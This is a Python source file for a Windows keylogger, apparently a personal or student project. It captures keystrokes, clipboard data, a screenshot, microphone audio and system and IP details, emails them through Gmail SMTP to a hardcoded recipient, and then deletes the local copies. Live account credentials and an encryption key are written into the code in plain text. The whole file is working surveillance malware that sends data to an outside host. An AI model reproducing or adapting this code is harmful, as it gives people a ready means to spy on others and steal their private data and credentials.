# Importing necessary libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from cryptography.fernet import Fernet
import os

# Define your file paths
file_path = "C:\\Users\\prana\\Documents\\KeyLoggerFiles" # Use a valid path on your system
extend = "\\"

# Add error handling for directory creation
if not os.path.exists(file_path):
    os.makedirs(file_path)

# Initialize other variables
keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 1

email_address = "keyloggernse@gmail.com"
password = "avvu szdp bdnc hpos"  # The 16-character app password you generated
username = getpass.getuser()
toaddr = "pranayjsathish2004@gmail.com"  # Email where you want to receive the logs
key = b'DxzUYNXf-jEYJ38GNhAJMU2IP320v7xrvSTX3jo0MOw='  # Paste the key that was generated by generate_key.py

file_merge = file_path + extend

# Define the list of files to delete after sending the email
delete_files = [
    system_information,
    clipboard_information,
    keys_information,
    screenshot_information,
    audio_information
]

# Ensure key_log.txt is created if it doesn't exist
key_log_path = os.path.join(file_path, keys_information)
if not os.path.exists(key_log_path):
    with open(key_log_path, "w") as f:
        f.write("")  # Create an empty file

# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()



# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

def record_keystrokes():
    def on_press(key):
        try:
            with open(key_log_path, "a") as f:
                if hasattr(key, 'char') and key.char:  # Record printable keys
                    f.write(key.char)
                elif key == Key.space:
                    f.write(" ")  # Replace space key with a space
                elif key == Key.enter:
                    f.write("\n")  # Newline for Enter key
                else:
                    f.write(f" [{key}] ")  # Record other special keys
        except Exception as e:
            print(f"Error recording keystroke: {str(e)}")

    def on_release(key):
        if key == Key.esc:  # Stop listener on Escape key
            return False

    print("Keystroke recording started... Press ESC to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

def collect_all_data():
    """Collect all data at once before sending"""
    try:
        
        # Clear existing files first
        for file in [system_information, clipboard_information, keys_information]:
            filepath = file_path + extend + file
            if os.path.exists(filepath):
                os.remove(filepath)
                print(f"Cleared existing {file}")
        
        # Collect data in sequence

         # Keystroke recording
        print("Recording keystrokes...")
        record_keystrokes()
        print("Keystrokes recorded")

        computer_information()
        print("System information collected")
        
        copy_clipboard()
        print("Clipboard data collected")
        
        screenshot()
        print("Screenshot taken")
        
        microphone()
        print("Audio recorded")
        
        return True
    except Exception as e:
        print(f"Error collecting data: {str(e)}")
        return False

def send_consolidated_email(toaddr, data_files):
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = f"Keylogger Report from {username}'s Computer - {time.strftime('%Y-%m-%d %H:%M:%S')}"

        # Create a more detailed email body
        body = f"""
Keylogger Report Details
========================
Generated from: {username}'s Computer
Date & Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
Duration: {microphone_time} seconds of audio
------------------------

Attached Files:
1. System Information (system specs, IP addresses)
2. Clipboard Contents
3. Keystroke Logs
4. Screenshot
5. Audio Recording

This report is encrypted for security.
        """
        msg.attach(MIMEText(body, 'plain'))

        # Attach all files with proper naming
        for filename, filepath in data_files:
            if os.path.exists(filepath) and os.path.getsize(filepath) > 0:  # Check if file exists and is not empty
                try:
                    with open(filepath, 'rb') as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        
                        # Add a timestamp to filename to prevent overwriting
                        timestamp = time.strftime("%Y%m%d-%H%M%S")
                        new_filename = f"{timestamp}_{filename}"
                        part.add_header(
                            'Content-Disposition',
                            f"attachment; filename= {new_filename}"
                        )
                        msg.attach(part)
                    print(f"Attached {filename}")
                except Exception as e:
                    print(f"Error attaching {filename}: {str(e)}")
            else:
                print(f"File not found or is empty: {filepath}")

        # Send email
        with smtplib.SMTP('smtp.gmail.com', 587) as s:
            s.starttls()
            s.login(fromaddr, password)
            text = msg.as_string()
            s.sendmail(fromaddr, toaddr, text)
            print("Email sent successfully!")
            
        return True
    except Exception as e:
        print(f"Failed to send email: {str(e)}")
        return False

def write_file(keys):
    try:
        with open(key_log_path, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k == "Key.space":
                    f.write(' ')  # Replace space key with an actual space
                elif k.find("Key") == -1:
                    f.write(k)
                else:
                    f.write(f" [{k}] ")  # Add brackets for special keys for clarity
    except Exception as e:
        print(f"Error writing to {keys_information}: {str(e)}")


# Main execution loop
def main():
    number_of_iterations = 0
    currentTime = time.time()
    stoppingTime = time.time() + time_iteration

    while number_of_iterations < number_of_iterations_end:
             print("\nStarting data collection...")
            
            # Collect all data
             if collect_all_data():
                print("\nData collected and sending data...")
                # Prepare files for sending
                files_to_send = [
                    (keys_information, key_log_path),
                    (screenshot_information, os.path.join(file_path, screenshot_information)),
                    (audio_information, os.path.join(file_path, audio_information)),
                    (system_information, os.path.join(file_path, system_information)),
                    (clipboard_information, os.path.join(file_path, clipboard_information))
                ]
                
                # Send consolidated email
                if send_consolidated_email(toaddr, files_to_send):
                    print("Email sent successfully, cleaning up...")
                    # Clean up files
                    try:
                        for file in delete_files:
                            file_path_to_delete = os.path.join(file_path, file)
                            if os.path.exists(file_path_to_delete):
                                os.remove(file_path_to_delete)
                                print(f"Deleted {file}")
                            else:
                                print(f"File not found for deletion: {file_path_to_delete}")
                    except Exception as e:
                        print(f"Error in cleanup: {str(e)}")

             number_of_iterations += 1
    currentTime = time.time()
    stoppingTime = time.time() + time_iteration

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Program crashed: {str(e)}")
